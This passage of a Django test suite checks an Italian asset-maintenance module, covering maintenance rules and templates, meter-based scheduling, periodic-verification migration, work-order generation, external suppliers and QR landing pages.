                "asset_category": str(self.category.id),
                "threshold_type": MaintenanceRule.THRESHOLD_DAYS,
                "threshold_value": "90",
                "sort_order": "30",
                "is_active": "on",
                "notes": "Intervento periodico standard",
            },
        )

        self.assertEqual(response.status_code, 302)
        rule = MaintenanceRule.objects.get(intervention_template=template, asset_category=self.category)
        self.assertEqual(rule.threshold_type, MaintenanceRule.THRESHOLD_DAYS)
        self.assertEqual(rule.threshold_value, 90)
        self.assertTrue(rule.is_active)

    def test_targeted_plan_generates_only_selected_asset_and_assigns_owner(self):
        template = MaintenanceInterventionTemplate.objects.create(
            code="targeted-plan-step-two",
            label="Controllo sicurezza guidato",
            maintenance_type=MaintenanceInterventionTemplate.TYPE_SAFETY,
            estimated_duration_minutes=45,
            asset_category=self.category,
        )
        selected_asset = Asset.objects.create(
            asset_tag="ML-TARGET-001",
            name="Macchina inclusa",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )
        excluded_asset = Asset.objects.create(
            asset_tag="ML-TARGET-002",
            name="Macchina esclusa",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:maintenance_rule_create"),
            {
                "intervention_template": str(template.id),
                "asset_category": str(self.category.id),
                "scope_type": MaintenanceRule.SCOPE_ASSETS,
                "assets": [str(selected_asset.id)],
                "threshold_type": MaintenanceRule.THRESHOLD_DAYS,
                "threshold_value": "30",
                "warning_days": "7",
                "first_due_date": timezone.localdate().isoformat(),
                "execution_mode": MaintenanceRule.MODE_INTERNAL,
                "assigned_to": str(self.admin.id),
                "auto_generate_workorders": "on",
                "sort_order": "10",
                "is_active": "on",
                "notes": "Solo sulla macchina inclusa",
            },
        )

        self.assertEqual(response.status_code, 302)
        rule = MaintenanceRule.objects.get(intervention_template=template)
        self.assertEqual(list(rule.assets.values_list("id", flat=True)), [selected_asset.id])
        call_command("generate_scheduled_workorders", stdout=io.StringIO())
        workorder = WorkOrder.objects.get(maintenance_rule=rule)
        self.assertEqual(workorder.asset, selected_asset)
        self.assertEqual(workorder.assigned_to, self.admin)
        self.assertEqual(workorder.kind, WorkOrder.KIND_SAFETY)
        self.assertFalse(WorkOrder.objects.filter(maintenance_rule=rule, asset=excluded_asset).exists())

    def test_activity_form_exposes_operational_catalog_fields(self):
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:maintenance_template_create"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Famiglia")
        self.assertContains(response, "Durata prevista (minuti)")
        self.assertContains(response, "Materiali e attrezzature")
        self.assertContains(response, "Procedura e controlli")

    def test_maintenance_rule_create_view_shows_template_management_when_templates_missing(self):
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:maintenance_rule_create") + f"?category={self.category.id}")

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Non ci sono template manutenzione attivi.")
        self.assertContains(response, reverse("assets:maintenance_template_list") + f"?category={self.category.id}")
        self.assertContains(response, reverse("assets:maintenance_template_create") + f"?category={self.category.id}")
        self.assertContains(response, reverse("assets:gestione_admin") + "?tab=categorie")
        self.assertContains(response, 'aria-disabled="true"', html=False)

    def test_maintenance_rule_create_view_warns_when_selected_category_has_no_compatible_templates(self):
        MaintenanceInterventionTemplate.objects.create(
            code="step-two-template-altro",
            label="Template altra categoria",
            asset_category=self.other_category,
        )
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:maintenance_rule_create") + f"?category={self.category.id}")

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Nessun template compatibile con la categoria")
        self.assertContains(response, self.category.label)

    def test_maintenance_rule_form_rejects_mismatched_template_category(self):
        foreign_template = MaintenanceInterventionTemplate.objects.create(
            code="controllo-elettrico-step-two",
            label="Controllo elettrico",
            asset_category=self.other_category,
        )

        form = MaintenanceRuleForm(
            data={
                "intervention_template": str(foreign_template.id),
                "asset_category": str(self.category.id),
                "threshold_type": MaintenanceRule.THRESHOLD_DAYS,
                "threshold_value": "45",
                "sort_order": "10",
                "is_active": "on",
                "notes": "",
            }
        )

        self.assertFalse(form.is_valid())
        self.assertIn("intervention_template", form.errors)

    def test_maintenance_templates_and_rules_routes_render(self):
        general_template = MaintenanceInterventionTemplate.objects.create(
            code="verifica-sicurezza-step-two",
            label="Verifica sicurezza",
            sort_order=5,
        )
        category_template = MaintenanceInterventionTemplate.objects.create(
            code="revisione-gruppo-step-two",
            label="Revisione gruppo",
            asset_category=self.category,
            sort_order=10,
        )
        MaintenanceRule.objects.create(
            intervention_template=category_template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=180,
            sort_order=10,
            notes="Regola standard di test",
        )

        self.client.force_login(self.admin)

        # Le vecchie liste standalone redirigono alle sezioni canoniche.
        settings_url = reverse("assets:maintenance_impostazioni")

        template_list_response = self.client.get(reverse("assets:maintenance_template_list"))
        self.assertEqual(template_list_response.status_code, 301)
        self.assertIn(settings_url, template_list_response["Location"])
        self.assertIn("tab=catalogo", template_list_response["Location"])

        rule_list_response = self.client.get(reverse("assets:maintenance_rule_list"))
        self.assertEqual(rule_list_response.status_code, 301)
        self.assertIn(settings_url, rule_list_response["Location"])
        self.assertIn("tab=piani", rule_list_response["Location"])

        settings_response = self.client.get(settings_url + "?tab=catalogo&active=all")
        self.assertEqual(settings_response.status_code, 200)
        self.assertContains(settings_response, "Catalogo attivita")
        self.assertContains(settings_response, general_template.label)
        self.assertContains(settings_response, category_template.label)

        plans_response = self.client.get(settings_url + "?tab=piani&active=all")
        self.assertEqual(plans_response.status_code, 200)
        self.assertContains(plans_response, "Piani ordinari")
        self.assertContains(plans_response, category_template.label)
        self.assertContains(settings_response, self.category.label)

    def test_maintenance_form_accepts_global_template_for_category_rule(self):
        template = MaintenanceInterventionTemplate.objects.create(
            code="controllo-filtri-step-two",
            label="Controllo filtri",
        )

        form = MaintenanceRuleForm(
            data={
                "intervention_template": str(template.id),
                "asset_category": str(self.category.id),
                "threshold_type": MaintenanceRule.THRESHOLD_HOURS,
                "threshold_value": "250",
                "sort_order": "40",
                "is_active": "on",
                "notes": "Template generale applicato a categoria specifica",
            }
        )

        self.assertTrue(form.is_valid(), form.errors.as_json())

    def test_generate_scheduled_workorders_copies_template_checklist(self):
        template = MaintenanceInterventionTemplate.objects.create(
            code="check-gen-step-two",
            label="Controllo generale",
            asset_category=self.category,
        )
        MaintenanceChecklistStep.objects.create(
            intervention_template=template, step_number=10, description="Controlla cinghie"
        )
        MaintenanceChecklistStep.objects.create(
            intervention_template=template, step_number=20, description="Lubrifica guide"
        )
        rule = MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=30,
        )
        asset = Asset.objects.create(
            asset_tag="ML-CHK-001",
            name="Macchina checklist",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )

        call_command("generate_scheduled_workorders", stdout=io.StringIO())

        workorder = WorkOrder.objects.get(asset=asset, maintenance_rule=rule)
        self.assertEqual(workorder.origin, WorkOrder.ORIGIN_PERIODIC)
        steps = list(WorkOrderChecklist.objects.filter(work_order=workorder).order_by("step_number"))
        self.assertEqual([s.description for s in steps], ["Controlla cinghie", "Lubrifica guide"])

    def test_maintenance_impostazioni_piano_tab_renders(self):
        template = MaintenanceInterventionTemplate.objects.create(
            code="piano-step-two",
            label="Intervento piano",
            asset_category=self.category,
        )
        MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=60,
        )
        Asset.objects.create(
            asset_tag="ML-PIANO-001",
            name="Macchina piano",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:maintenance_impostazioni") + "?tab=piano")

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Piano di manutenzione per categoria")
        self.assertContains(response, self.category.label)


class AssetMeterScheduleTests(TestCase):
    """Fase 2.1 — scadenzario e generatore per regole a contatore (ore/km/cicli)."""

    def setUp(self):
        self.category = AssetCategory.objects.create(
            code="cnc-meter", label="CNC contatore", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.template = MaintenanceInterventionTemplate.objects.create(
            code="tagliando-ore", label="Tagliando ore", asset_category=self.category,
        )
        self.rule = MaintenanceRule.objects.create(
            intervention_template=self.template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_HOURS,
            threshold_value=500,
            warning_days=50,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-MTR-001",
            name="Tornio contatore",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )

    def _set_meter(self, value):
        return AssetMeter.objects.create(
            asset=self.asset, meter_type=AssetMeter.METER_HOURS, current_value=value, unit_label="h",
        )

    def _rows(self):
        return build_maintenance_schedule_rows(
            asset_queryset=Asset.objects.filter(pk=self.asset.id).select_related("asset_category")
        )

    def test_meter_payload_status_thresholds(self):
        upcoming = meter_schedule_payload(current_value=100, base_value=0, threshold_value=500, warning_units=50)
        warning = meter_schedule_payload(current_value=470, base_value=0, threshold_value=500, warning_units=50)
        overdue = meter_schedule_payload(current_value=520, base_value=0, threshold_value=500, warning_units=50)
        missing = meter_schedule_payload(current_value=None, base_value=0, threshold_value=500, warning_units=50)
        self.assertEqual(upcoming["status"], "upcoming")
        self.assertFalse(upcoming["due"])
        self.assertEqual(warning["status"], "warning")
        self.assertTrue(warning["due"])
        self.assertEqual(overdue["status"], "overdue")
        self.assertTrue(overdue["due"])
        self.assertEqual(missing["status"], "missing")

    def test_schedule_meter_rule_upcoming(self):
        self._set_meter(100)
        rows = self._rows()
        self.assertEqual(len(rows), 1)
        self.assertTrue(rows[0]["is_meter_based"])
        self.assertEqual(rows[0]["schedule_status"], "upcoming")
        self.assertIsNone(rows[0]["due_date"])

    def test_schedule_meter_rule_warning_and_overdue(self):
        self._set_meter(470)
        self.assertEqual(self._rows()[0]["schedule_status"], "warning")
        AssetMeter.objects.filter(asset=self.asset, meter_type=AssetMeter.METER_HOURS).update(current_value=520)
        self.assertEqual(self._rows()[0]["schedule_status"], "overdue")

    def test_schedule_meter_rule_missing_without_meter(self):
        rows = self._rows()
        self.assertEqual(rows[0]["schedule_status"], "missing")
        self.assertIn("Contatore", rows[0]["schedule_label"])

    def test_generator_creates_meter_workorder_when_due(self):
        self._set_meter(480)
        call_command("generate_scheduled_workorders", stdout=io.StringIO())
        self.assertTrue(
            WorkOrder.objects.filter(
                asset=self.asset, maintenance_rule=self.rule, origin=WorkOrder.ORIGIN_PERIODIC
            ).exists()
        )

    def test_generator_skips_meter_workorder_when_not_due(self):
        self._set_meter(100)
        call_command("generate_scheduled_workorders", stdout=io.StringIO())
        self.assertFalse(WorkOrder.objects.filter(asset=self.asset, maintenance_rule=self.rule).exists())

    def test_workorder_close_snapshots_current_meter_value(self):
        self._set_meter(520)
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            maintenance_rule=self.rule,
            origin=WorkOrder.ORIGIN_PERIODIC,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Tagliando ore - CNC-MTR-001",
        )

        workorder.close(status=WorkOrder.STATUS_DONE, resolution="Eseguito.")

        workorder.refresh_from_db()
        self.assertEqual(workorder.meter_value_at_close, Decimal("520.00"))

    def test_sync_snapshots_meter_value_for_recorded_execution(self):
        meter = self._set_meter(520)
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            maintenance_rule=self.rule,
            origin=WorkOrder.ORIGIN_PERIODIC,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=WorkOrder.STATUS_DONE,
            title="Tagliando ore registrato",
            closed_at=timezone.now(),
        )

        sync_workorder_maintenance_state(workorder)
        workorder.refresh_from_db()
        self.assertEqual(workorder.meter_value_at_close, Decimal("520.00"))

        AssetMeter.objects.filter(pk=meter.pk).update(current_value=540)
        row = self._rows()[0]
        self.assertEqual(row["schedule_status"], "upcoming")
        self.assertEqual(row["meter_remaining"], 480.0)


class PeriodicVerificationConvergenceTests(TestCase):
    """Fase 2.3 — convergenza PeriodicVerification → MaintenanceRule."""

    def setUp(self):
        self.admin = User.objects.create_superuser(
            username="pv-conv-admin", email="pv-conv@test.local", password="pass12345",
        )
        self.category = AssetCategory.objects.create(
            code="pv-conv-cat", label="Carroponti conv", base_asset_type=Asset.TYPE_CARROPONTE, sort_order=10,
        )
        self.asset = Asset.objects.create(
            asset_tag="CP-CONV-001", name="Carroponte conv", asset_type=Asset.TYPE_CARROPONTE,
            asset_category=self.category, status=Asset.STATUS_IN_USE,
        )
        self.pv = PeriodicVerification.objects.create(
            name="Verifica fune annuale", frequency_months=12, is_active=True,
        )
        self.pv.assets.add(self.asset)

    def test_service_migrates_single_category_plan(self):
        from assets.services.periodic_migration import migrate_periodic_verification_to_rule

        result = migrate_periodic_verification_to_rule(self.pv)
        self.assertTrue(result["ok"])
        self.assertTrue(result["created_template"])
        self.assertTrue(result["created_rule"])
        self.assertEqual(result["rule"].threshold_type, MaintenanceRule.THRESHOLD_DAYS)
        self.assertEqual(result["rule"].threshold_value, 360)  # 12 mesi × 30
        self.pv.refresh_from_db()
        self.assertTrue(self.pv.is_legacy)

    def test_service_splits_multi_category_plan_without_expanding_scope(self):
        from assets.services.periodic_migration import migrate_periodic_verification_to_rule

        other_cat = AssetCategory.objects.create(
            code="pv-conv-other", label="Altro conv", base_asset_type=Asset.TYPE_CNC, sort_order=20,
        )
        other_asset = Asset.objects.create(
            asset_tag="CNC-CONV-001", name="CNC conv", asset_type=Asset.TYPE_CNC,
            asset_category=other_cat, status=Asset.STATUS_IN_USE,
        )
        self.pv.assets.add(other_asset)
        result = migrate_periodic_verification_to_rule(self.pv)
        self.assertTrue(result["ok"])
        self.assertEqual(len(result["rules"]), 2)
        self.assertTrue(all(rule.scope_type == MaintenanceRule.SCOPE_ASSETS for rule in result["rules"]))
        self.assertEqual(
            {asset_id for rule in result["rules"] for asset_id in rule.assets.values_list("id", flat=True)},
            {self.asset.id, other_asset.id},
        )
        self.pv.refresh_from_db()
        self.assertTrue(self.pv.is_legacy)

    def test_ui_convert_action_creates_rule_and_marks_legacy(self):
        self.client.force_login(self.admin)
        response = self.client.post(
            reverse("assets:periodic_verifications") + "?scope=production",
            {
                "action": "convert_periodic_to_rule",
                "scope": "production",
                "verification_id": str(self.pv.id),
            },
        )
        self.assertEqual(response.status_code, 302)
        self.pv.refresh_from_db()
        self.assertTrue(self.pv.is_legacy)
        self.assertTrue(
            MaintenanceRule.objects.filter(
                asset_category=self.category, threshold_type=MaintenanceRule.THRESHOLD_DAYS
            ).exists()
        )

    def test_ingestion_links_existing_history_and_initializes_plan_state(self):
        from assets.services.periodic_migration import migrate_periodic_verification_to_rule

        closed_at = timezone.now() - timedelta(days=12)
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            periodic_verification=self.pv,
            origin=WorkOrder.ORIGIN_PERIODIC,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=WorkOrder.STATUS_DONE,
            title="Storico verifica fune",
            closed_at=closed_at,
        )

        result = migrate_periodic_verification_to_rule(self.pv)

        workorder.refresh_from_db()
        self.assertEqual(workorder.maintenance_rule, result["rule"])
        state = AssetMaintenanceRuleState.objects.get(asset=self.asset, base_rule=result["rule"])
        self.assertEqual(state.last_work_order, workorder)
        self.assertEqual(state.last_execution_date, closed_at.date())

    def test_second_convert_is_idempotent(self):
        from assets.services.periodic_migration import migrate_periodic_verification_to_rule

        migrate_periodic_verification_to_rule(self.pv)
        rules_after_first = MaintenanceRule.objects.count()
        result2 = migrate_periodic_verification_to_rule(self.pv)
        self.assertTrue(result2["ok"])
        self.assertFalse(result2["created_rule"])
        self.assertEqual(MaintenanceRule.objects.count(), rules_after_first)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetMaintenanceStepThreeTests(TestCase):
    def setUp(self):
        self.admin = User.objects.create_superuser(
            username="asset-step-three-admin",
            email="asset-step-three-admin@test.local",
            password="pass12345",
        )
        self.category = AssetCategory.objects.create(
            code="step-three-category",
            label="Categoria Step Three",
            base_asset_type=Asset.TYPE_WORK_MACHINE,
            sort_order=10,
        )
        self.other_category = AssetCategory.objects.create(
            code="step-three-other-category",
            label="Categoria Step Three Altro",
            base_asset_type=Asset.TYPE_HW,
            sort_order=20,
        )
        self.asset = Asset.objects.create(
            name="Centro di lavoro ST3",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=self.category,
            reparto="OFF",
            source_key="asset-step-three-main",
        )
        self.general_template = MaintenanceInterventionTemplate.objects.create(
            code="step-three-general-template",
            label="Verifica sicurezza generale",
        )
        self.category_template = MaintenanceInterventionTemplate.objects.create(
            code="step-three-category-template",
            label="Lubrificazione guidata",
            asset_category=self.category,
        )
        self.other_category_template = MaintenanceInterventionTemplate.objects.create(
            code="step-three-other-template",
            label="Template altra categoria",
            asset_category=self.other_category,
        )
        self.base_rule = MaintenanceRule.objects.create(
            intervention_template=self.category_template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=90,
            sort_order=10,
            notes="Regola standard di categoria",
        )
        self.foreign_rule = MaintenanceRule.objects.create(
            intervention_template=self.other_category_template,
            asset_category=self.other_category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=120,
            sort_order=20,
            notes="Regola altra categoria",
        )

    def test_asset_detail_planned_maintenance_row_generates_once_then_opens_closure_report(self):
        self.client.force_login(self.admin)

        page = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))

        self.assertEqual(page.status_code, 200)
        schedule_row = next(
            row for row in page.context["asset_schedule_rows"] if row["base_rule"].id == self.base_rule.id
        )
        self.assertIsNone(schedule_row["open_workorder"])
        self.assertContains(page, "Manutenzione pianificata")
        self.assertContains(page, "Genera rapporto")

        detail_url = reverse("assets:asset_view", kwargs={"id": self.asset.id})
        post_data = {
            "action": "prepare_planned_maintenance_report",
            "base_rule_id": self.base_rule.id,
        }
        first_response = self.client.post(detail_url, post_data)
        workorder = WorkOrder.objects.get(asset=self.asset, maintenance_rule=self.base_rule)
        close_url = reverse("assets:wo_close", kwargs={"id": workorder.id})

        self.assertRedirects(first_response, close_url, fetch_redirect_response=False)
        self.assertEqual(workorder.status, WorkOrder.STATUS_OPEN)
        self.assertEqual(workorder.origin, WorkOrder.ORIGIN_PERIODIC)
        self.assertEqual(workorder.kind, self.category_template.workorder_kind)
        self.assertEqual(workorder.title, f"{self.category_template.label} — {self.asset.asset_tag}")

        second_response = self.client.post(detail_url, post_data)
        self.assertRedirects(second_response, close_url, fetch_redirect_response=False)
        self.assertEqual(
            WorkOrder.objects.filter(asset=self.asset, maintenance_rule=self.base_rule).count(),
            1,
        )

        refreshed_page = self.client.get(detail_url)
        refreshed_row = next(
            row
            for row in refreshed_page.context["asset_schedule_rows"]
            if row["base_rule"].id == self.base_rule.id
        )
        self.assertEqual(refreshed_row["open_workorder"], workorder)
        self.assertEqual(refreshed_row["workorder_close_url"], close_url)
        self.assertContains(refreshed_page, "Compila e chiudi rapporto")
        self.assertContains(refreshed_page, f'href="{close_url}"')

    def test_maintenance_schedule_internal_external_filter_and_badge(self):
        from anagrafica.models import Fornitore

        supplier = Fornitore.objects.create(ragione_sociale="Ditta Esterna Srl")
        self.base_rule.execution_mode = MaintenanceRule.MODE_EXTERNAL
        self.base_rule.supplier = supplier
        self.base_rule.save(update_fields=["execution_mode", "supplier"])
        self.assertTrue(self.base_rule.is_external)
        self.client.force_login(self.admin)

        # Filtro "Esterne": la riga è presente con badge "Esterna" e fornitore.
        page_ext = self.client.get(
            reverse("assets:maintenance_schedule")
            + f"?asset={self.asset.id}&status=all&execution=external"
        )
        self.assertEqual(page_ext.status_code, 200)
        self.assertContains(page_ext, "Lubrificazione guidata")
        self.assertContains(page_ext, "Esterna")
        self.assertContains(page_ext, "Ditta Esterna Srl")

        # Filtro "Interne": la regola esterna NON compare.
        page_int = self.client.get(
            reverse("assets:maintenance_schedule")
            + f"?asset={self.asset.id}&status=all&execution=internal"
        )
        self.assertEqual(page_int.status_code, 200)
        self.assertNotContains(page_int, "Lubrificazione guidata")

    def test_external_rule_execution_inherits_supplier_on_workorder(self):
        from anagrafica.models import Fornitore

        supplier = Fornitore.objects.create(ragione_sociale="Assistenza Terza Srl")
        self.base_rule.execution_mode = MaintenanceRule.MODE_EXTERNAL
        self.base_rule.supplier = supplier
        self.base_rule.save(update_fields=["execution_mode", "supplier"])
        self.client.force_login(self.admin)

        resp = self.client.post(
            reverse("assets:maintenance_schedule"),
            {
                "action": "record_maintenance_rule_execution",
                "asset_id": str(self.asset.id),
                "base_rule_id": str(self.base_rule.id),
                "execution_date": timezone.localdate().isoformat(),
                "execution_duration_minutes": "30",
                "execution_notes": "Intervento eseguito dalla ditta esterna",
            },
        )
        self.assertEqual(resp.status_code, 302)
        workorder = (
            WorkOrder.objects.filter(asset=self.asset, maintenance_rule=self.base_rule)
            .order_by("-id")
            .first()
        )
        self.assertIsNotNone(workorder)
        self.assertEqual(workorder.status, WorkOrder.STATUS_DONE)
        self.assertEqual(workorder.supplier_id, supplier.id)

    def test_maintenance_suppliers_page_and_redirect(self):
        from anagrafica.models import Fornitore

        supplier = Fornitore.objects.create(ragione_sociale="Fornitore Manut Srl")
        self.base_rule.execution_mode = MaintenanceRule.MODE_EXTERNAL
        self.base_rule.supplier = supplier
        self.base_rule.save(update_fields=["execution_mode", "supplier"])
        self.client.force_login(self.admin)

        # La vecchia tab ?tab=fornitori ora redirige alla pagina dedicata.
        redir = self.client.get(reverse("assets:maintenance_impostazioni") + "?tab=fornitori")
        self.assertEqual(redir.status_code, 302)
        self.assertIn(reverse("assets:maintenance_suppliers"), redir["Location"])

        # Pagina dedicata: elenca il fornitore con link al modulo /fornitori/.
        page = self.client.get(reverse("assets:maintenance_suppliers"))
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, "Fornitori usati in manutenzione")
        self.assertContains(page, "Fornitore Manut Srl")
        self.assertContains(page, reverse("fornitori:fornitore_detail", kwargs={"fornitore_id": supplier.id}))

    def test_bulk_generate_workorders_for_category(self):
        from datetime import timedelta

        from assets.models import AssetMaintenanceRuleState

        self.asset.status = Asset.STATUS_IN_USE
        self.asset.save(update_fields=["status"])
        AssetMaintenanceRuleState.objects.update_or_create(
            asset=self.asset,
            base_rule=self.base_rule,
            defaults={"last_execution_date": timezone.localdate() - timedelta(days=500)},
        )
        self.client.force_login(self.admin)
        url = reverse("assets:maintenance_impostazioni")

        resp = self.client.post(url, {"action": "generate_workorders", "category_id": str(self.category.id)})
        self.assertEqual(resp.status_code, 302)
        open_qs = WorkOrder.objects.filter(
            asset=self.asset, maintenance_rule=self.base_rule,
            status=WorkOrder.STATUS_OPEN, origin=WorkOrder.ORIGIN_PERIODIC,
        )
        self.assertEqual(open_qs.count(), 1)

        # Idempotente: un secondo click non duplica (OdL già aperto).
        self.client.post(url, {"action": "generate_workorders", "category_id": str(self.category.id)})
        self.assertEqual(open_qs.count(), 1)

    def test_maintenance_schedule_view_selector(self):
        self.client.force_login(self.admin)
        base = reverse("assets:maintenance_schedule")
        for vista in ("lista", "board", "macchina"):
            resp = self.client.get(base + f"?vista={vista}&status=all")
            self.assertEqual(resp.status_code, 200)
            self.assertContains(resp, "ms-viewsel")
        board = self.client.get(base + "?vista=board&status=all")
        self.assertContains(board, "ms-board")
        self.assertContains(board, "Scadute")
        macchina = self.client.get(base + "?vista=macchina&status=all")
        self.assertContains(macchina, "ms-machines")
        self.assertContains(macchina, self.asset.asset_tag)

    def test_maintenance_worksheet_renders(self):
        self.client.force_login(self.admin)
        resp = self.client.get(
            reverse(
                "assets:maintenance_worksheet",
                kwargs={"asset_id": self.asset.id, "rule_id": self.base_rule.id},
            )
        )
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, "Scheda intervento")
        self.assertContains(resp, self.asset.asset_tag)
        self.assertContains(resp, self.category_template.label)

    def test_maintenance_reminders_includes_overdue_rules(self):
        from datetime import timedelta
        from io import StringIO

        from django.core.management import call_command

        from assets.models import AssetMaintenanceRuleState

        AssetMaintenanceRuleState.objects.update_or_create(
            asset=self.asset,
            base_rule=self.base_rule,
            defaults={"last_execution_date": timezone.localdate() - timedelta(days=500)},
        )
        out = StringIO()
        call_command("send_maintenance_reminders", "--dry-run", stdout=out)
        output = out.getvalue()
        # Q1: una regola scaduta non sta più fra le "in scadenza": sale nella sezione SCADUTE.
        self.assertIn("SCADUTE", output)
        self.assertIn("[SCADUTA] Manutenzione programmata", output)
        self.assertIn(self.asset.asset_tag, output)

    def test_quick_record_copies_and_marks_checklist(self):
        from assets.models import MaintenanceChecklistStep, WorkOrderChecklist

        MaintenanceChecklistStep.objects.create(
            intervention_template=self.category_template, step_number=10, description="Controlla livello olio"
        )
        MaintenanceChecklistStep.objects.create(
            intervention_template=self.category_template, step_number=20, description="Pulisci filtri"
        )
        self.client.force_login(self.admin)

        resp = self.client.post(
            reverse("assets:maintenance_schedule"),
            {
                "action": "record_maintenance_rule_execution",
                "asset_id": str(self.asset.id),
                "base_rule_id": str(self.base_rule.id),
                "execution_date": timezone.localdate().isoformat(),
                "execution_duration_minutes": "0",
                "execution_notes": "eseguito",
                "checklist_done": ["10"],  # solo lo step 10 spuntato
            },
        )
        self.assertEqual(resp.status_code, 302)
        workorder = (
            WorkOrder.objects.filter(asset=self.asset, maintenance_rule=self.base_rule)
            .order_by("-id")
            .first()
        )
        items = {c.step_number: c.is_done for c in WorkOrderChecklist.objects.filter(work_order=workorder)}
        self.assertEqual(items, {10: True, 20: False})

    def test_asset_qr_landing_shows_maintenance_and_documents(self):
        if not self.asset.asset_tag:
            self.asset.asset_tag = "QR-TEST-1"
            self.asset.save(update_fields=["asset_tag"])
        self.client.force_login(self.admin)

        resp = self.client.get(
            reverse("assets:asset_qr_landing", kwargs={"asset_tag": self.asset.asset_tag})
        )
        self.assertEqual(resp.status_code, 200)
        # Le nuove sezioni mobile: manutenzioni in scadenza + documenti.
        self.assertContains(resp, "Manutenzioni")
        self.assertContains(resp, "Documenti")
        # La regola di categoria dell'asset (missing/prima esecuzione) compare come voce.
        self.assertContains(resp, self.category_template.label)

    def test_seed_fornitori_manutenzione_command(self):
        from io import StringIO

        from django.core.management import call_command

        from anagrafica.models import Fornitore

        # Un fornitore già presente con nome più completo: l'idempotenza fuzzy deve saltarlo.
        Fornitore.objects.create(ragione_sociale="Bruschi di Pino Florio")

        call_command(
            "seed_fornitori_manutenzione",
            "--names", "Bruschi,Zega Manut",
            "--commit",
            stdout=StringIO(),
        )
        # "Bruschi" saltato (contenuto in "Bruschi di Pino Florio"), "Zega Manut" creato.
        self.assertFalse(Fornitore.objects.filter(ragione_sociale="Bruschi").exists())
        zega = Fornitore.objects.filter(ragione_sociale="Zega Manut").first()
        self.assertIsNotNone(zega)
        self.assertEqual(zega.categoria, Fornitore.CATEGORIA_MANUTENZIONE)

        # Re-run idempotente: nessun duplicato.
        call_command("seed_fornitori_manutenzione", "--names", "Zega Manut", "--commit", stdout=StringIO())
        self.assertEqual(Fornitore.objects.filter(ragione_sociale="Zega Manut").count(), 1)

    def test_classify_maintenance_external_command(self):
        from io import StringIO

        from django.core.management import call_command

        from anagrafica.models import Fornitore

        supplier = Fornitore.objects.create(ragione_sociale="F-gas Cert Srl")
        template = MaintenanceInterventionTemplate.objects.create(
            code="caus-a16", label="Controllo perdita freon", asset_category=self.category
        )
        rule = MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=365,
        )
        self.assertFalse(rule.is_external)

        # Dry-run: non scrive.
        call_command("classify_maintenance_external", "--external", "A16", "--dry-run", stdout=StringIO())
        rule.refresh_from_db()
        self.assertFalse(rule.is_external)

        # Commit: marca esterna + assegna fornitore.
        call_command(
            "classify_maintenance_external",
            "--external", "A16",
            "--supplier", str(supplier.id),
            "--commit",
            stdout=StringIO(),
        )
        rule.refresh_from_db()
        self.assertTrue(rule.is_external)
        self.assertEqual(rule.supplier_id, supplier.id)

        # La regola interna (self.base_rule) resta invariata.
        self.base_rule.refresh_from_db()
        self.assertFalse(self.base_rule.is_external)

    def test_maintenance_rule_form_accepts_external_with_supplier(self):
        from anagrafica.models import Fornitore

        supplier = Fornitore.objects.create(ragione_sociale="Manutenzioni Terze Srl")
        form = MaintenanceRuleForm(
            data={
                "intervention_template": str(self.category_template.id),
                "asset_category": str(self.category.id),
                "threshold_type": MaintenanceRule.THRESHOLD_DAYS,
                "threshold_value": "180",
                "warning_days": "15",
                "execution_mode": MaintenanceRule.MODE_EXTERNAL,
                "supplier": str(supplier.id),
                "sort_order": "10",
                "is_active": "on",
                "notes": "",
            }
        )
        self.assertTrue(form.is_valid(), form.errors.as_json())
        rule = form.save()
        self.assertTrue(rule.is_external)
        self.assertEqual(rule.supplier_id, supplier.id)

        # Interna → il fornitore viene azzerato dalla normalizzazione del modello.
        rule.execution_mode = MaintenanceRule.MODE_INTERNAL
        rule.full_clean()
        self.assertIsNone(rule.supplier_id)

    def test_override_create_view_creates_valid_override(self):
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse(
                "assets:asset_maintenance_rule_override_create",
                kwargs={"asset_id": self.asset.id, "rule_id": self.base_rule.id},
            ),
            {
                "asset": str(self.asset.id),
